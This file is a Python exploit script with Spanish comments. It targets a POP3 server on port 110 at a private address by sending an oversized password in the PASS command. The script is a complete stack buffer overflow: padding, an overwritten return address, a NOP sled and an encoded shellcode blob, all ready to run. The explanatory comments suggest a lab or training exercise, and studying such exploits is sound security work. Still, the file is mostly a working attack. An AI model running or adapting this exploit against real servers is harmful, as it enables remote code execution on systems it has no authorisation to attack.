#!/usr/bin/python3
from struct import pack
import socket
import sys

# Variables globales
#A donde queremos atacar
ip_address = "192.168.1.73"
port = 110
#Lo que llegamos a hacer aqui fue un typecasting
offset = 4654

before_eip=b"A"*offset
eip = pack("<L" , 0x76856fe7)

shellcode = (b"\xbf\x45\x8b\xea\x4c\xd9\xc4\xd9\x74\x24\xf4\x5d\x33\xc9"
b"\xb1\x52\x31\x7d\x12\x03\x7d\x12\x83\xa8\x77\x08\xb9\xce"
b"\x60\x4f\x42\x2e\x71\x30\xca\xcb\x40\x70\xa8\x98\xf3\x40"
b"\xba\xcc\xff\x2b\xee\xe4\x74\x59\x27\x0b\x3c\xd4\x11\x22"
b"\xbd\x45\x61\x25\x3d\x94\xb6\x85\x7c\x57\xcb\xc4\xb9\x8a"
b"\x26\x94\x12\xc0\x95\x08\x16\x9c\x25\xa3\x64\x30\x2e\x50"
b"\x3c\x33\x1f\xc7\x36\x6a\xbf\xe6\x9b\x06\xf6\xf0\xf8\x23"
b"\x40\x8b\xcb\xd8\x53\x5d\x02\x20\xff\xa0\xaa\xd3\x01\xe5"
b"\x0d\x0c\x74\x1f\x6e\xb1\x8f\xe4\x0c\x6d\x05\xfe\xb7\xe6"
b"\xbd\xda\x46\x2a\x5b\xa9\x45\x87\x2f\xf5\x49\x16\xe3\x8e"
b"\x76\x93\x02\x40\xff\xe7\x20\x44\x5b\xb3\x49\xdd\x01\x12"
b"\x75\x3d\xea\xcb\xd3\x36\x07\x1f\x6e\x15\x40\xec\x43\xa5"
b"\x90\x7a\xd3\xd6\xa2\x25\x4f\x70\x8f\xae\x49\x87\xf0\x84"
b"\x2e\x17\x0f\x27\x4f\x3e\xd4\x73\x1f\x28\xfd\xfb\xf4\xa8"
b"\x02\x2e\x5a\xf8\xac\x81\x1b\xa8\x0c\x72\xf4\xa2\x82\xad"
b"\xe4\xcd\x48\xc6\x8f\x34\x1b\x29\xe7\x37\x9c\xc1\xfa\x37"
b"\x23\xa9\x72\xd1\x49\xdd\xd2\x4a\xe6\x44\x7f\x00\x97\x89"
b"\x55\x6d\x97\x02\x5a\x92\x56\xe3\x17\x80\x0f\x03\x62\xfa"
b"\x86\x1c\x58\x92\x45\x8e\x07\x62\x03\xb3\x9f\x35\x44\x05"
b"\xd6\xd3\x78\x3c\x40\xc1\x80\xd8\xab\x41\x5f\x19\x35\x48"
b"\x12\x25\x11\x5a\xea\xa6\x1d\x0e\xa2\xf0\xcb\xf8\x04\xab"
b"\xbd\x52\xdf\x00\x14\x32\xa6\x6a\xa7\x44\xa7\xa6\x51\xa8"
b"\x16\x1f\x24\xd7\x97\xf7\xa0\xa0\xc5\x67\x4e\x7b\x4e\x87"
b"\xad\xa9\xbb\x20\x68\x38\x06\x2d\x8b\x97\x45\x48\x08\x1d"
b"\x36\xaf\x10\x54\x33\xeb\x96\x85\x49\x64\x73\xa9\xfe\x85"
b"\x56")


                            # b"\x83\xEC\x10"
payload = before_eip + eip +  b"\x90"*16 + shellcode
def exploit():

    #Indicando que vamos a crear una conexion via TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #Indicamos conexion
    s.connect((ip_address, port))

    #Recibir el banner (respuesta)
    banner = s.recv(1024)
    #Para enviar los datos que deseamos enviar(la b es para que este en formato bytes)
    #\r es igual a si presionaramos el enter
    s.send(b"USER felix" + b'\r\n')
    response = s.recv(1024)
    print(response)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    
    exploit()